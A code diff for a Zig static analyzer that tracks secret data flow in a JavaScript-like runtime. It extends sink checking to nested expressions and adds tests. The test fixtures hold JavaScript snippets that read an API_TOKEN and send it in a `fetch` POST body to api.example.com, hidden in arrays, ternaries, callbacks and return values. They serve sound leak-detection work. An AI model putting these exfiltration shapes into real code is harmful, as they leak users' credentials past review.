@@ -248,6 +248,9 @@ const Origin = struct {
 /// what bounds that work.
 const max_summary_params = 8;
 const max_summary_depth = 8;
+/// Deepest expression `scanExprSinks` reads before it gives up and clears the
+/// sink properties.
+const max_scan_depth = 256;
 /// Bound on the passes that a recursive summary may take when its parameter
 /// labels keep widening. The labels are a fixed set of flags, so the widening
 /// ends well before this; reaching it fails closed.
@@ -718,7 +721,16 @@ pub const FlowChecker = struct {
             self.walkStmt(func.body);
             return collected;
         }
-        return self.inferLabels(func.body);
+        return self.exprBodyLabels(func.body);
+    }
+
+    /// The labels of a function body that is a bare expression, with the sinks
+    /// inside it checked. A concise arrow body is normally a `return_stmt`, which
+    /// `walkStmt` checks; this covers a body the parser leaves as the expression.
+    fn exprBodyLabels(self: *FlowChecker, body: NodeIndex) LabelSet {
+        const labels = self.inferLabels(body);
+        self.scanExprSinks(body);
+        return labels;
     }
 
     /// Push a summary frame for `node`. The caller decrements `summary_depth`
@@ -820,7 +832,7 @@ pub const FlowChecker = struct {
             defer self.summary_returns = saved;
             self.walkStmt(func.body);
             break :blk collected;
-        } else self.inferLabels(func.body);
+        } else self.exprBodyLabels(func.body);
         if (self.allocation_failed) return error.OutOfMemory;
         return labels;
     }
@@ -2304,6 +2316,7 @@ pub const FlowChecker = struct {
 
             .if_stmt => {
                 const if_s = self.ir_view.getIfStmt(node) orelse return;
+                self.scanExprSinks(if_s.condition);
 
                 // Both `working_constraints` and `working_io_calls` are
                 // path-scoped: entering a branch extends them, leaving
@@ -2358,7 +2371,7 @@ pub const FlowChecker = struct {
                     // result is bound (`const r = fetch(url, { body: secret })`),
                     // not only on bare-statement calls. checkExprSinks self-guards
                     // to a no-op for any initializer that is not such a call.
-                    self.checkExprSinks(vd.init);
+                    self.scanExprSinks(vd.init);
                 } else {
                     // `let y;` starts empty on every walk for the same reason.
                     const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
@@ -2370,9 +2383,14 @@ pub const FlowChecker = struct {
 
             .return_stmt => {
                 if (self.ir_view.getOptValue(node)) |ret_val| {
+                    // A sink inside the returned expression runs on this path
+                    // too: `return fetch(url, { body: secret })`, a field of
+                    // the response, a concise arrow body (which is a return).
                     if (self.summary_returns) |acc| {
                         acc.* = LabelSet.merge(acc.*, self.inferLabels(ret_val));
+                        self.scanExprSinks(ret_val);
                     } else {
+                        self.scanExprSinks(ret_val);
                         // Check if returning data via Response helpers
                         self.checkResponseSink(ret_val);
                     }
@@ -2381,14 +2399,18 @@ pub const FlowChecker = struct {
 
             .expr_stmt => {
                 if (self.ir_view.getOptValue(node)) |expr| {
-                    self.checkExprSinks(expr);
+                    self.scanExprSinks(expr);
                     // A call written as a statement discards its value, and
                     // only the label inference enters a called body. Without
                     // this a helper that logs its secret argument is silent
                     // when it is called as `audit(secret);` and checked when
-                    // it is called as `const n = audit(secret);`.
+                    // it is called as `const n = audit(secret);`. Any other
+                    // expression statement that is not an assignment (`ok &&
+                    // audit(secret);`, a ternary of calls) discards its value
+                    // the same way, and its calls enter their callee bodies
+                    // only through the label inference.
                     const expr_tag = self.ir_view.getTag(expr) orelse .lit_undefined;
-                    if (expr_tag == .call or expr_tag == .method_call) _ = self.inferLabels(expr);
+                    if (expr_tag != .assignment) _ = self.inferLabels(expr);
                     self.propagateMutatingMethodTaint(expr);
                     // An assignment written as a statement (`obj.field = secret;`)
                     // parses as an expr_stmt wrapping the assignment, so the
@@ -2402,6 +2424,7 @@ pub const FlowChecker = struct {
                 const fi = self.ir_view.getForIter(node) orelse return;
                 // Iteration variable inherits labels from iterable
                 const iterable_labels = self.inferLabels(fi.iterable);
+                self.scanExprSinks(fi.iterable);
                 if (!iterable_labels.isEmpty()) {
                     const key = packBindingKey(fi.binding.scope_id, fi.binding.slot);
                     self.binding_labels.put(self.allocator, key, iterable_labels) catch self.markAllocationFailure();
@@ -2411,6 +2434,7 @@ pub const FlowChecker = struct {
 
             .switch_stmt => {
                 const sw = self.ir_view.getSwitchStmt(node) orelse return;
+                self.scanExprSinks(sw.discriminant);
                 for (0..sw.cases_count) |i| {
                     const case_idx = self.ir_view.getListIndex(sw.cases_start, @intCast(i));
                     const cc = self.ir_view.getCaseClause(case_idx) orelse continue;
@@ -2436,13 +2460,14 @@ pub const FlowChecker = struct {
             },
 
             .call, .method_call => {
-                self.checkExprSinks(node);
+                self.scanExprSinks(node);
             },
 
             .assert_stmt => {
                 const assert = self.ir_view.getAssertStmt(node) orelse return;
+                self.scanExprSinks(assert.condition);
                 if (assert.error_expr != null_node) {
-                    self.checkExprSinks(assert.error_expr);
+                    self.scanExprSinks(assert.error_expr);
                 }
             },
 
@@ -3226,7 +3251,7 @@ pub const FlowChecker = struct {
             self.walkStmt(function.body);
             return collected;
         }
-        return self.inferLabels(function.body);
+        return self.exprBodyLabels(function.body);
     }
 
     fn isUnresolvedFunctionValueCallee(self: *const FlowChecker, callee: NodeIndex) bool {
@@ -3827,7 +3852,7 @@ pub const FlowChecker = struct {
             return collected;
         }
         // Arrow expression body: the body is the return expression.
-        return self.inferLabels(func.body);
+        return self.exprBodyLabels(func.body);
     }
 
     /// A call to a function that is already on the summary stack. The active
@@ -4033,6 +4058,104 @@ pub const FlowChecker = struct {
         }
         // Reporting appends no producer, so the list is stable while it is read.
         for (self.html_producers.items) |producer| self.reportUnvalidatedHtml(producer);
+    }
+
+    /// Check every sink call inside an expression (plan unit F5). A sink can
+    /// sit anywhere an expression can: a statement, an initializer, a return
+    /// value, a concise arrow body, a condition, or inside another expression
+    /// as an array element, an object field, a ternary arm, or a call argument.
+    /// `checkExprSinks` reads only the call it is given, so this walks the
+    /// expression and gives it each call, inner calls first, which is the order
+    /// the runtime evaluates them in. A function literal is not entered: its
+    /// body runs when it is called, and the callee walks reach it there.
+    fn scanExprSinks(self: *FlowChecker, node: NodeIndex) void {
+        self.scanExprSinksAt(node, 0);
+    }
+
+    fn scanExprSinksAt(self: *FlowChecker, node: NodeIndex, depth: u16) void {
+        if (node == null_node) return;
+        // An expression nested deeper than any real program leaves part of
+        // itself unread, and a sink in that part would be silent. The property
+        // goes unproven instead.
+        if (depth >= max_scan_depth) {
+            self.clearAllSinkProperties();
+            return;
+        }
+        const tag = self.ir_view.getTag(node) orelse return;
+        const next = depth + 1;
+        switch (tag) {
+            .call, .method_call => {
+                const call_data = self.ir_view.getCall(node) orelse return;
+                self.scanExprSinksAt(call_data.callee, next);
+                for (0..call_data.args_count) |i| {
+                    self.scanExprSinksAt(self.ir_view.getListIndex(call_data.args_start, @intCast(i)), next);
+                }
+                self.checkExprSinks(node);
+            },
+            .binary_op => {
+                const bin = self.ir_view.getBinary(node) orelse return;
+                self.scanExprSinksAt(bin.left, next);
+                self.scanExprSinksAt(bin.right, next);
+            },
+            .ternary => {
+                const t = self.ir_view.getTernary(node) orelse return;
+                self.scanExprSinksAt(t.condition, next);
+                self.scanExprSinksAt(t.then_branch, next);
+                self.scanExprSinksAt(t.else_branch, next);
+            },
+            .unary_op => {
+                const unary = self.ir_view.getUnary(node) orelse return;
+                self.scanExprSinksAt(unary.operand, next);
+            },
+            .member_access, .optional_chain, .computed_access => {
+                const member = self.ir_view.getMember(node) orelse return;
+                self.scanExprSinksAt(member.object, next);
+                self.scanExprSinksAt(member.computed, next);
+            },
+            .object_literal => {
+                const obj = self.ir_view.getObject(node) orelse return;
+                var i: u16 = 0;
+                while (i < obj.properties_count) : (i += 1) {
+                    const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
+                    const prop_tag = self.ir_view.getTag(prop_idx) orelse continue;
+                    if (prop_tag == .object_property) {
+                        const prop = self.ir_view.getProperty(prop_idx) orelse continue;
+                        self.scanExprSinksAt(prop.value, next);
+                    } else if (prop_tag == .object_spread) {
+                        if (self.ir_view.getOptValue(prop_idx)) |val| self.scanExprSinksAt(val, next);
+                    }
+                }
+            },
+            .array_literal => {
+                const arr = self.ir_view.getArray(node) orelse return;
+                var i: u16 = 0;
+                while (i < arr.elements_count) : (i += 1) {
+                    self.scanExprSinksAt(self.ir_view.getListIndex(arr.elements_start, i), next);
+                }
+            },
+            .spread => {
+                if (self.ir_view.getOptValue(node)) |operand| self.scanExprSinksAt(operand, next);
+            },
+            .assignment => {
+                const asgn = self.ir_view.getAssignment(node) orelse return;
+                self.scanExprSinksAt(asgn.value, next);
+            },
+            .match_expr => {
+                const match_data = self.ir_view.getMatchExpr(node) orelse return;
+                self.scanExprSinksAt(match_data.discriminant, next);
+                var i: u8 = 0;
+                while (i < match_data.arms_count) : (i += 1) {
+                    const arm_idx = self.ir_view.getListIndex(match_data.arms_start, i);
+                    const arm = self.ir_view.getMatchArm(arm_idx) orelse continue;
+                    self.scanExprSinksAt(arm.body, next);
+                }
+            },
+            // exhaustive: literals and identifiers hold no call. A function
+            // literal runs when it is called, and the walks that enter a
+            // callee (`functionCallLabels`, `closureResultLabelsBound`) check
+            // its body there, with the parameters bound.
+            else => {},
+        }
     }
 
     fn checkExprSinks(self: *FlowChecker, node: NodeIndex) void {
@@ -7006,6 +7129,183 @@ test "FlowChecker reports callee-built HTML only when it reaches the response (F
     ;
     const routed_report = try runFlowDiagnostics(std.testing.allocator, routed, .unvalidated_input_in_egress, &buf);
     try std.testing.expectEqual(@as(usize, 1), routed_report.count);
+}
+
+test "FlowChecker checks sinks on return paths, concise bodies, and nested expressions (F5)" {
+    const head =
+        \\import { env } from "zttp:env";
+        \\import { fetch } from "zttp:fetch";
+        \\import { logInfo } from "zttp:log";
+        \\
+    ;
+    const Case = struct { name: []const u8, source: []const u8 };
+
+    // Each source leaks a secret through a sink that the walk used to skip.
+    // The direct form sits in the handler; the routed forms put the same sink
+    // in a callee. All of them must lose `no_secret_leakage`.
+    const leaking = [_]Case{
+        .{ .name = "return path, direct", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  return fetch("https://api.example.com/x", { method: "POST", body: t });
+            \\}
+        },
+        .{ .name = "return path, field of the response", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  return Response.json({ status: fetch("https://api.example.com/x", { method: "POST", body: t }).status });
+            \\}
+        },
+        .{ .name = "return path, in a callee", .source = head ++
+            \\function send(x) { return fetch("https://api.example.com/x", { method: "POST", body: x }); }
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  const r = send(t);
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+        .{ .name = "concise body, in a callee", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  const inner = (x) => logInfo(x, { n: 1 });
+            \\  const n = inner(t);
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+        .{ .name = "concise body, fetch field", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  const inner = (x) => fetch("https://api.example.com/x", { method: "POST", body: x }).status;
+            \\  const n = inner(t);
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+        .{ .name = "concise body, array callback", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  const n = [t].map((x) => fetch("https://api.example.com/x", { method: "POST", body: x }).status);
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+        .{ .name = "nested in an array", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  const rs = [fetch("https://api.example.com/x", { method: "POST", body: t })];
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+        .{ .name = "nested in an object field", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  const o = { r: fetch("https://api.example.com/x", { method: "POST", body: t }) };
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+        .{ .name = "nested in a ternary arm", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  const r = req.method === "GET" ? fetch("https://api.example.com/x", { method: "POST", body: t }) : 0;
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+        .{ .name = "nested in a call argument", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  logInfo("sent", { status: fetch("https://api.example.com/x", { method: "POST", body: t }).status });
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+        .{ .name = "nested in an assignment statement", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  let r = 0;
+            \\  r = fetch("https://api.example.com/x", { method: "POST", body: t });
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+        .{ .name = "nested in an if condition", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  if (fetch("https://api.example.com/x", { method: "POST", body: t }).ok) return Response.json({ ok: 1 });
+            \\  return Response.json({ ok: 0 });
+            \\}
+        },
+        .{ .name = "nested in a callee expression", .source = head ++
+            \\function send(x) {
+            \\  const rs = [fetch("https://api.example.com/x", { method: "POST", body: x })];
+            \\  return 1;
+            \\}
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  const n = send(t);
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+    };
+    for (leaking) |case| {
+        errdefer std.debug.print("case still proven: {s}\n", .{case.name});
+        const properties = try runFlowProperties(std.testing.allocator, case.source);
+        try std.testing.expect(!properties.no_secret_leakage);
+    }
+
+    // Controls: the same shapes with a literal where the secret was.
+    const clean = [_]Case{
+        .{ .name = "return path", .source = head ++
+            \\function send(x) { return fetch("https://api.example.com/x", { method: "POST", body: x }); }
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  const r = send("hello");
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+        .{ .name = "concise body", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  const inner = (x) => logInfo(x, { n: 1 });
+            \\  const n = inner("hello");
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+        .{ .name = "nested", .source = head ++
+            \\function handler(req) {
+            \\  const t = env("API_TOKEN") ?? "";
+            \\  const rs = [fetch("https://api.example.com/x", { method: "POST", body: "hello" })];
+            \\  return Response.json({ ok: 1 });
+            \\}
+        },
+    };
+    for (clean) |case| {
+        errdefer std.debug.print("case wrongly refused: {s}\n", .{case.name});
+        const properties = try runFlowProperties(std.testing.allocator, case.source);
+        try std.testing.expect(properties.no_secret_leakage);
+    }
+}
+
+test "FlowChecker reports a nested sink once, with the same text as the statement form (F5)" {
+    var buf: [512]u8 = undefined;
+    const statement =
+        \\import { env } from "zttp:env";
+        \\import { fetch } from "zttp:fetch";
+        \\function handler(req) {
+        \\  const t = env("API_TOKEN") ?? "";
+        \\  fetch("https://api.example.com/x", { method: "POST", body: t });
+        \\  return Response.json({ ok: 1 });
+        \\}
+    ;
+    const nested =
+        \\import { env } from "zttp:env";
+        \\import { fetch } from "zttp:fetch";
+        \\function handler(req) {
+        \\  const t = env("API_TOKEN") ?? "";
+        \\  return Response.json({ s: fetch("https://api.example.com/x", { method: "POST", body: t }).status });
+        \\}
+    ;
+    const statement_report = try runFlowDiagnostics(std.testing.allocator, statement, .secret_in_egress_body, &buf);
+    try std.testing.expectEqual(@as(usize, 1), statement_report.count);
+    var nested_buf: [512]u8 = undefined;
+    const nested_report = try runFlowDiagnostics(std.testing.allocator, nested, .secret_in_egress_body, &nested_buf);
+    try std.testing.expectEqual(@as(usize, 1), nested_report.count);
+    try std.testing.expectEqualStrings(statement_report.help, nested_report.help);
 }
 
 test "FlowChecker re-walks a callee without the labels an earlier call bound" {
